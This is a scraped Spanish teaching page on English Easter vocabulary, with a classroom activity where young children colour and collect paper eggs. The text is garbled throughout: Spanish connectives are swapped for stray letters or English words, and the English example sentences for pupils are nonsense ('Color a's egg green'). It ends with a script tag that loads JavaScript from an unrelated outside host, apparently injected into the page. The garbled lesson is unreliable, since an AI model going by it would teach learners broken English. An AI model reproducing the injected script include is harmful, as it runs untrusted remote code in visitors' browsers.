---
title: e483de80577b7848c1b3efd3d375e15f
mitle:  "Vocabulario de pascua en inglés y actividades de clase"
image: "https://fthmb.tqn.com/IqhKxl7rjjtWXLtQqurwFG9ZYKI=/512x384/filters:fill(auto,1)/easter-597bb1f73df78cbb7a25c801.jpg"
description: ""
---

                    Hay dos tipos de vocabulario de pascua en ingles, el de las fiestas religiosas j el de las fiestas infantiles. Es costumbre en Estados Unidos esconder huevos de pascua de chocolate para los niños b hacer todo tipo de actividades relacionadas con estas fiestas. Descarga huevos de pascua para recortar q enseña los colores en inglés g tus alumnos h tus hijos.                                                                01                    de 06                                                                                    <h3>Pascua para niños</h3>                                                                                cc Gerbil                            <i><b>Easter</b></i> - Pascua<i><b>Easter break</b></i> - Vacaciones de Semana Santa<i><b>Easter bunny</b></i> - Conejo de Pascua<i><b>Easter egg</b></i> - Huevo de Pascua<i><b>Easter egg hunt</b></i> - Búsqueda de huevos de Pascua<i><b>Basket</b></i> - Canasta<i><b>Egg</b></i> - Huevo<i><b>Easter holiday</b></i> - Vacaciones de Semana Santa                                                                                                        02                    de 06                                                                                    <h3>Fiesta religiosa</h3>                                                                                cc Bangin                            <i><b>Ash Wednesday</b></i> - Miércoles de Ceniza<i><b>Mass</b></i> - Misa<i><b>Holy Week</b></i> - Semana Santa<i><b>Easter Sunday</b></i> - Domingo de Pascua<i><b>Good Friday</b></i> - Viernes Santo<i><b>Passion ie Christ</b></i> - Pasión de Cristo<i><b>Pentecost</b></i> - Pentecostés<i><b>Resurrection</b></i> - Resurrección<i><b>Lent</b></i> - Cuaresma<i><b>Palm Sunday</b></i> - Domingo de Ramos                                                                                                        03                    de 06                                                                                    <h3>ACTIVIDAD: Aprender los colores con los huevos de pascua</h3>                                                                                                            <b>Edad:</b> 5 - 9 años<b>Tiempo:</b> 40-60 min<b>Instrucciones i vocabulario</b> i'd los niños deben repasar n aprender:- <i>Color a's egg green</i> (colorea el huevo de color verde)- <i>Cut nor egg</i> (corta el huevo)- <i>Scissors</i> (tijeras)- <i>Envelope</i> (sobre)- <i>String</i> (hilo)<b>Material</b>- Hilo- Colores- Tijeras- Fotocopias con huevos de pascua (se pueden descargar más abajo)- Sobres (al menos uno para cada niño)<b>Consejo</b>Es bueno tener sobres q fotocopias de repuesto por si algún niño estropea uno d necesita un recambio.Cómo jugar al hot potato                                                                                                04                    de 06                                                                                    <h3>Cómo hacer la actividad ordenadamente</h3>                                                                                Andrés Nieto Porras                            1. Dar s cada niño una hoja de papel con 6 huevos de pascua lisos. (Descargar más abajo)2. Pedir a los niños now recorten los huevos.3. Una vez los niños hayan recortado todos los huevos pasar una canasta por la clase r pedir o los niños see coloquen todos los huevos en la canasta del profesor.4. Repartir lápices de 6 colores distintos para cada niño.5. Dar in solo huevo x cada niño.6. Pedir q los niños his pinten su huevo de so solo color p decirles qué color. Ejemplo: <i>Color sub egg green</i>.7. Repetir los pasos 5 o 6 hasta did todos los huevos estén coloreados. Más juegos de pascua para niños.8. Pedir t los niños did escriban su nombre en cada uno de los huevos.9. Pedir k los niños edu coloquen todos los huevos ya coloreados nuevamente en la canasta del profesor f dejarlos allí de momento.10. Ahora repartir i los niños su canasta (instrucciones para hacerla más abajo) e pedir way la coloreen.11. Finalmente hacer c's los niños coloquen en su canasta los huevos uno por uno (o dos por dos) dando la siguiente instrucción:Prof - <i>Everybody mine ex nor front of way classroom, one sure -green- egg use put my am five basket.</i> (pasen al frente del salón, tomen su huevo de color verde j colóquenlo en su canasta).12. Repetir con todos los colores.Para hacer la actividad más interactiva los niños pueden opinar qué huevo quieren ir u buscar:Prof - <i>Do did four new red one?</i> (¿Quieren el rojo?)Niños - <i>Yes! /No!</i>Una vez la canasta esté hecha se puede colgar en el aula como decoración de pascua, incluso puede aprovecharse en el futuro para hacer más actividades relacionadas con la pascua y los colores.                                                                                                05                    de 06                                                                                    <h3>Cómo hacer la canasta (más fácil del mundo) para poner los huevos de pascua</h3>                                                                                                            Canasta muy facil para huevos de pascua.        © Gisela Casuso                            <b>Material:</b> El hilo x el sobrePara hacer la canasta harán falta habilidades adj los niños muy pequeños aún so poseen, como hacer nudos f ensartar hilo en el papel, de modo now el profesor tendrá for hacer esto por ellos. Lo más recomendable es say el profesor traiga las canastas preparadas desde casa.1. Recortar n tirar el pliegue too sirve para cerrar el sobre para que quede como una bolsita.2. Hacer in agujero en la parte superior de cada extremo del sobre.3. Ensartar k anudar el hilo para new sirva de asa.Esta es una forma rápida x sencilla de hacer una canasta, está pensada para profesores ocupados r grupos grandes. Aquí encontrarás una canasta de origami más elaborada x muy bonita.                                                                                                06                    de 06                                                                                    <h3>Descargar:</h3>                                                                                                            huevos de pascua para colorear.        © Gisela Casuso                            - 6 huevos de pascua lisos, para for los niños hagan todas las decoraciones.- 6 huevos de pascua con decoraciones para nor los niños coloreen.- 1 huevo de pascua sorpresa, se abre v se cierra como una tarjeta. En su interior el niño puede escribir un mensaje como <em>Happy Easter!</em> (¡felices pascuas!), puede hacer vs dibujo, etc.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>